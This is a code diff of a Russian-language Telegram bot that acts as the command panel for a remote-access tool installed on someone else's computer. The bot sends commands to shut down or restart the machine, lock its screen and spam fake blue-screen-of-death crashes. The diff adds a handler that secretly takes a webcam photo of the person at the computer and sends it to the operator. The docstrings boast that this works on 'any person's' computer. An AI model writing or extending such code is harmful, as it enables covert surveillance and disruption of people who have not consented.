@@ -10,20 +10,6 @@ router = Router()
 global_data_store = {}
 client = None
 
-"""
-# @router.message(Form.connected)
-# async def send_message(message: Message, ):
-#     global client
-#     if client:
-#         try:
-#             client.send(message.text.encode())
-#             await message.answer(f'Сообщение отправлено: {message.text}')
-#         except Exception as e:
-#             await message.answer(f'Ошибка при отправке сообщения: {e}')
-#     else:
-#         await message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
-"""
-
 
 async def check_input_type(text):
     # Проверяем, состоит ли текст из 4 цифр
@@ -127,7 +113,7 @@ async def shutdown_data(callback: CallbackQuery):
 
     if client:
         try:
-            client.send("shutdown".encode())
+            client.send("shutdown_data".encode())
             await callback.message.answer('Компьютер успешно выключен.')
         except Exception as e:
             await callback.message.answer(f"Ошибка при отправке сообщения: {e}")
@@ -151,7 +137,7 @@ async def restart_data(callback: CallbackQuery):
     if client:
         try:
             await callback.message.answer('Компьютер успешно перезагружен.')
-            client.send('restart'.encode())
+            client.send('reload_data'.encode())
         except Exception as e:
             await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
     else:
@@ -167,13 +153,14 @@ async def look_screen_func(callback: CallbackQuery):
       На стороне клиента эта функция уже обрабатывает функцию для выключения экрана до первого взаимодействия пользователя с компьютером. После чего экран сново включиться.
       Тем самым мы можем удаленно выключать экран любого компьютера.
     """
+
     await callback.answer('')
     global client
 
     if client:
         try:
-            await callback.message.answer('Компьютер перемещен в спящее состояние!')
-            client.send('look_screen'.encode())
+            await callback.message.answer('Экран компьютера заблокирован успешно!!')
+            client.send('lock_screen_data'.encode())
         except Exception as e:
             await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
     else:
@@ -189,13 +176,14 @@ async def blue_screen_in_brows(callback: CallbackQuery):
       На стороне клиента эта функция уже обрабатывает функцию бесконечного открытия фоток синего экрана смерти компьютера.
       Тем самым мы можем удаленно вызвать шуточный спам синего экран смерти компьютера, любого человека.
     """
+
     await callback.answer('')
     global client
 
     if client:
         try:
             await callback.message.answer('Синий экран вызван успешно!')
-            client.send('spam_brows_bsod'.encode())
+            client.send('bsod_screen_brows_data'.encode())
         except Exception as e:
             await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
     else:
@@ -211,13 +199,34 @@ async def blue_screen(callback: CallbackQuery):
       На стороне клиента эта функция уже обрабатывает функцию вызова шуточного синего экрана смерти компьютера.
       Тем самым мы можем удаленно вызвать шуточный синий экран смерти компьютера, любого человека.
     """
+
     await callback.answer('')
     global client
 
     if client:
         try:
             await callback.message.answer('Синий экран вызван успешно!')
-            client.send('bsod_error'.encode())
+            client.send('blue_screen_of_dead'.encode())
+        except Exception as e:
+            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
+    else:
+        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
+
+
+# Функция скриншота камеры пользователя и отправки фотографии в телеграмм
+@router.callback_query(F.data == 'screenshot_user')
+async def screenshot_user_func(callback: CallbackQuery):
+    """
+    Данная функция делает скриншот пользователя если у пользователя есть камера
+    В случае если есть, программа делает фотку и отправляет вам фотку в личные сообщения.
+    """
+
+    await callback.answer('')
+    global client
+
+    if client:
+        try:
+            client.send('screenshot_user'.encode())
         except Exception as e:
             await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
     else:
@@ -231,12 +240,9 @@ async def blue_screen(callback: CallbackQuery):
 @router.callback_query(F.data == 'control_youtube')
 async def control_youtube_keyboard(callback: CallbackQuery):
     """
-
-    :param callback:
-    :return:
     """
-    await callback.answer('')
 
+    await callback.answer('')
     await callback.message.edit_text('Доступный функционал использования программы Youtube: ', reply_markup=make_row_inline_keyboards(keyboard_control_youtube))
 
 
